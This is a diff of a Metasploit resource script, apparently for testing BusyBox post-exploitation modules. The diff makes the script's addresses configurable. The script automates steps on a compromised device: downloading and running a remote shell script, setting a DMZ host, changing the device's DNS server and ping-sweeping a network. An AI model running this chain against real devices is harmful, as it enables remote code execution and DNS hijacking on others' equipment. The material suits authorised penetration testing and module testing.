@@ -1,5 +1,4 @@
 # auto_busybox.rc
-# Author: Javier Vicente Vallejo (Web: http://vallejo.cc / Twitter: @vallejocc)
 
 <ruby>
 
@@ -29,13 +28,33 @@ if (framework.datastore['RHOSTS'] == nil)
 	return
 end
 
+if (framework.datastore['TARGETHOST'] == nil)
+	print_status("you have to set TARGETHOST globally ... exiting")
+	return
+end
+
+if (framework.datastore['DNSSRV'] == nil)
+	print_status("you have to set DNSSRV globally ... exiting")
+	return
+end
+
+if (framework.datastore['STARTIP'] == nil)
+	print_status("you have to set STARTIP globally ... exiting")
+	return
+end
+
+if (framework.datastore['ENDIP'] == nil)
+	print_status("you have to set STARTIP globally ... exiting")
+	return
+end
+
 print_line("")
 print_line("starting ...")
 print_line("")
 
 session=prepare_session()
 run_single("use post/linux/manage/busybox_wgetandexec")
-run_single("set URL http://192.168.1.128/test.sh")
+run_single("set URL http://#{framework.datastore['TARGETHOST']}/test.sh")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("run")
@@ -64,7 +83,7 @@ sleep 1
 
 session=prepare_session()
 run_single("use post/linux/manage/busybox_setdmz")
-run_single("set TARGETHOST 192.168.1.128")
+run_single("set TARGETHOST #{framework.datastore['TARGETHOST']}")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("set DELETE false")
@@ -73,7 +92,7 @@ sleep 1
 		
 session=prepare_session()
 run_single("use post/linux/manage/busybox_setdmz")
-run_single("set TARGETHOST 192.168.1.128")
+run_single("set TARGETHOST #{framework.datastore['TARGETHOST']}")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("set DELETE true")
@@ -82,7 +101,7 @@ sleep 1
 
 session=prepare_session()
 run_single("use post/linux/manage/busybox_setdns")
-run_single("set SRVHOST 8.8.8.8")
+run_single("set SRVHOST #{framework.datastore['DNSSRV']}")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("run")	
@@ -90,8 +109,8 @@ sleep 1
 
 session=prepare_session()
 run_single("use post/linux/gather/busybox_pingnet")
-run_single("set IPRANGESTART 192.168.1.1")
-run_single("set IPRANGEEND 192.168.1.10")
+run_single("set IPRANGESTART #{framework.datastore['STARTIP']}")
+run_single("set IPRANGEEND #{framework.datastore['ENDIP']}")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("run")
